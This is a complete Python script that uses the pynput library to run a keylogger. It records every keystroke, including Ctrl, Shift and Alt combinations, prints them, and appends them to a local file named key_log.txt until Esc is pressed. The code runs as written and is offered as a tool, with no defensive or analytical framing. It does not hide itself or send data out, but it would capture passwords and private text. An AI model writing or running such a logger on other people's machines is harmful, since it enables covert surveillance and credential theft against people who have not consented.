from pynput import keyboard

# Define the file to store the log
log_file = "key_log.txt"

# Track modifier keys
active_modifiers = set()

def on_press(key):
    global active_modifiers
    try:
        # Handle modifier keys
        if key in {keyboard.Key.ctrl_l, keyboard.Key.ctrl_r}:
            active_modifiers.add("Ctrl")
        elif key in {keyboard.Key.shift, keyboard.Key.shift_r}:
            active_modifiers.add("Shift")
        elif key in {keyboard.Key.alt_l, keyboard.Key.alt_r}:
            active_modifiers.add("Alt")

        # Check for combinations
        if active_modifiers:
            # Handle printable keys
            if hasattr(key, 'char') and key.char is not None:
                combo = "+".join(active_modifiers) + f"+{key.char}"
            else:
                # For special or non-character keys
                combo = "+".join(active_modifiers) + f"+{str(key)}"
            print(combo, end=" ", flush=True)
            with open(log_file, "a") as file:
                file.write(combo + " ")
        else:
            # Handle standalone keys
            if hasattr(key, 'char') and key.char is not None:
                print(key.char, end="", flush=True)
                with open(log_file, "a") as file:
                    file.write(key.char)
            else:
                special_key = f"[{str(key)}]"
                print(special_key, end=" ", flush=True)
                with open(log_file, "a") as file:
                    file.write(special_key + " ")
    except Exception as e:
        print(f"[Error: {e}]")

def on_release(key):
    global active_modifiers
    # Remove modifier keys when released
    if key in {keyboard.Key.ctrl_l, keyboard.Key.ctrl_r}:
        active_modifiers.discard("Ctrl")
    elif key in {keyboard.Key.shift, keyboard.Key.shift_r}:
        active_modifiers.discard("Shift")
    elif key in {keyboard.Key.alt_l, keyboard.Key.alt_r}:
        active_modifiers.discard("Alt")

    # Stop the keylogger when the Escape key is released
    if key == keyboard.Key.esc:
        print("\nKeylogger stopped.")
        return False

# Create a listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger is running... Press 'Esc' to stop.")
    listener.join()
